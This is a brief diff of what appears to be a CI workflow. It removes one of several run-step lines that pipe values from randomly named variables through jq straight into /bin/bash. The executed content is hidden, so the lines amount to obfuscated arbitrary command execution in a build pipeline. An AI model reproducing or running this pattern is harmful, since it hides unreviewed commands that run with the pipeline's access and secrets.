@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$sxon470" | jq -r .t57230 | /bin/bash
           echo $v7 | jq -r .wmtq006 | /bin/bash
-          printf '%s' "$wvfs57587" | jq -r .sab6737 | /bin/bash
           echo $byv86 | jq -r .odo4 | /bin/bash
 
       - name: Upload output
